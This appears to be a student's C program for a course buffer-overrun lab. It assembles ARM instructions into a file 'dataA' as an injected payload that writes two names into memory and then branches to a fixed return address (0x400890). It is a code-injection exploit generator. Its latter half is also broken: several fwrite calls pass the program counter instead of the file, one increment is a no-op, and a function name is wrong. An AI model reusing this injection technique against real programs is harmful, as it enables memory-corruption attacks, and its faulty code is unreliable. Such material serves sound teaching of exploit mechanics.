#include <stdio.h>

int main(void)
{
    FILE *psFile;
    int i;
    unsigned long returnAddr = 0x400890;
    unsigned long pc; 
    int instr; 

    psFile = fopen("dataA", "w");
    pc = 0; 
    /* 99 total instructions * 4 = 396*/
    instr = MiniAssembler_adr(1, 396, pc); 
    fwrite(&instr, 4, 1, psFile); 
    pc+= 4; 

    for (i = 0; i < 24; i++) { 
        instr = MiniAssembler_mov(0, (int)"Ben Zhou and Owen Clarke"[i]);
        fwrite(&instr, 4, 1, psFile);
        pc+=4; 

        instr = MiniAssembler_adr(2, 396 + i, pc); 
        fwrite(&instr, 4, 1, psFile); 
        pc+=4; 

        instr = MiniAssembler_strb(0, 2); 
        fwrite(&instr, 4, 1, psFile); 
        pc+=4; 
    }
    instr = MiniAssembler_mov(0,0); 
    fwrite(&instr, 4, 1, pc); 
    pc+4; 

    for (i = 0; i < 24; i++) { 
        instr = strb(0, 2); 
        fwrite(&instr, 4, 1, pc); 
        pc+=4; 
    }

    instr = MiniAssembler_b(returnAddr, 392); 
    fwrite(&instr, 4, 1, pc); 
    pc+=4; 

    
    fclose(psFile);

    return 0;
}